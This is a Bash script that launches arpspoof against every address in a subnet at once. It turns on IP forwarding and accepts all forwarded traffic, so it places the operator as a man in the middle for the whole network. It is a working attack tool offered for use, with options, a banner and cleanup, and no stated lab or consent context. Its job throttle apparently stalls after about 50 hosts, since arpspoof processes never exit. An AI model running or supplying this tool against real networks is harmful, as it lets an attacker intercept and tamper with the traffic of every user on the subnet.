#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
# AllNetwork_Spoof.sh — Network-wide ARP Spoof Launcher
# Runs arpspoof against all hosts in a subnet simultaneously.
#
# Usage:
#   sudo bash AllNetwork_Spoof.sh
#   sudo bash AllNetwork_Spoof.sh -i eth0 -s 192.168.0 -g 192.168.0.1
#   sudo bash AllNetwork_Spoof.sh -i wlan0 -s 10.0.0 --start 1 --end 50
# ═══════════════════════════════════════════════════════════════════════════
set -euo pipefail

# ── Defaults ─────────────────────────────────────────────────────────────
IFACE="ens33"
SUBNET="192.168.1"
GATEWAY="${SUBNET}.1"
RANGE_START=1
RANGE_END=254
MAX_JOBS=50           # Limit concurrent arpspoof processes

# ── Colors ───────────────────────────────────────────────────────────────
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
CYAN='\033[0;96m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ── Track child PIDs for cleanup ─────────────────────────────────────────
CHILD_PIDS=()

usage() {
    echo -e "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════╗"
    echo "║    Network-wide ARP Spoof Launcher       ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo "Usage: sudo $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i, --interface IFACE    Network interface (default: $IFACE)"
    echo "  -s, --subnet BASE       Subnet base, e.g. 192.168.1 (default: $SUBNET)"
    echo "  -g, --gateway IP        Gateway IP (default: \${SUBNET}.1)"
    echo "      --start N           Start of IP range (default: $RANGE_START)"
    echo "      --end N             End of IP range (default: $RANGE_END)"
    echo "  -j, --jobs N            Max concurrent jobs (default: $MAX_JOBS)"
    echo "  -h, --help              Show this help"
    echo ""
    echo "Example:"
    echo "  sudo $0 -i eth0 -s 10.0.0 -g 10.0.0.1 --start 2 --end 100"
    echo ""
}

# ── Parse arguments ──────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        -i|--interface) IFACE="$2";       shift 2 ;;
        -s|--subnet)    SUBNET="$2";      shift 2 ;;
        -g|--gateway)   GATEWAY="$2";     shift 2 ;;
        --start)        RANGE_START="$2"; shift 2 ;;
        --end)          RANGE_END="$2";   shift 2 ;;
        -j|--jobs)      MAX_JOBS="$2";    shift 2 ;;
        -h|--help)      usage; exit 0 ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${RESET}"
            usage
            exit 1
            ;;
    esac
done

# ── Validation ───────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root (sudo).${RESET}"
    exit 1
fi

if ! command -v arpspoof &>/dev/null; then
    echo -e "${RED}[!] arpspoof not found. Install it with: sudo apt install -y dsniff${RESET}"
    exit 1
fi

# Check interface exists
if ! ip link show "$IFACE" &>/dev/null; then
    echo -e "${RED}[!] Interface '$IFACE' not found.${RESET}"
    echo -e "${YELLOW}    Available interfaces:${RESET}"
    ip -br link show | awk '{print "      " $1}'
    exit 1
fi

if [[ $RANGE_START -lt 1 || $RANGE_END -gt 254 || $RANGE_START -gt $RANGE_END ]]; then
    echo -e "${RED}[!] Invalid range: $RANGE_START-$RANGE_END (must be 1-254).${RESET}"
    exit 1
fi

# ── Cleanup function ─────────────────────────────────────────────────────
cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Stopping all arpspoof processes...${RESET}"

    for pid in "${CHILD_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null || true
        fi
    done

    # Kill any remaining arpspoof processes we might have missed
    pkill -f "arpspoof -i ${IFACE}" 2>/dev/null || true

    wait 2>/dev/null || true
    echo -e "${GREEN}[+] All processes stopped. Cleanup complete.${RESET}"
    echo -e "${YELLOW}[*] Note: ARP caches on victim hosts will self-heal in ~60s.${RESET}"
    exit 0
}

trap cleanup SIGINT SIGTERM EXIT

# ── Setup forwarding ─────────────────────────────────────────────────────
echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════╗"
echo "║    Network-wide ARP Spoof Launcher       ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${RESET}"
echo -e "${YELLOW}[*] Configuration:${RESET}"
echo -e "    Interface : ${CYAN}${IFACE}${RESET}"
echo -e "    Subnet    : ${CYAN}${SUBNET}.${RANGE_START} - ${SUBNET}.${RANGE_END}${RESET}"
echo -e "    Gateway   : ${CYAN}${GATEWAY}${RESET}"
echo -e "    Max jobs  : ${CYAN}${MAX_JOBS}${RESET}"
echo ""

# Enable IP forwarding
echo -e "${YELLOW}[*] Enabling IP forwarding...${RESET}"
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
iptables -P FORWARD ACCEPT 2>/dev/null || true
echo -e "${GREEN}[+] IP forwarding enabled.${RESET}"

# ── Launch arpspoof workers ──────────────────────────────────────────────
TOTAL=$((RANGE_END - RANGE_START + 1))
LAUNCHED=0

echo ""
echo -e "${YELLOW}[*] Launching arpspoof for ${TOTAL} targets...${RESET}"
echo -e "${DIM}    Press Ctrl+C to stop all processes.${RESET}"
echo ""

for i in $(seq "$RANGE_START" "$RANGE_END"); do
    ip="${SUBNET}.${i}"

    # Skip the gateway itself
    if [[ "$ip" == "$GATEWAY" ]]; then
        continue
    fi

    # Launch in background, suppress output
    arpspoof -i "$IFACE" -t "$ip" -r "$GATEWAY" > /dev/null 2>&1 &
    CHILD_PIDS+=($!)
    LAUNCHED=$((LAUNCHED + 1))

    # Progress indicator every 25 hosts
    if (( LAUNCHED % 25 == 0 )); then
        echo -e "    ${DIM}Launched ${LAUNCHED}/${TOTAL}...${RESET}"
    fi

    # Throttle: wait if too many concurrent jobs
    while (( $(jobs -rp | wc -l) >= MAX_JOBS )); do
        sleep 0.1
    done
done

echo ""
echo -e "${GREEN}${BOLD}[+] All ${LAUNCHED} arpspoof processes running.${RESET}"
echo -e "${DIM}    Spoofing is active. Press Ctrl+C to stop.${RESET}"
echo ""

# Keep running until interrupted
wait
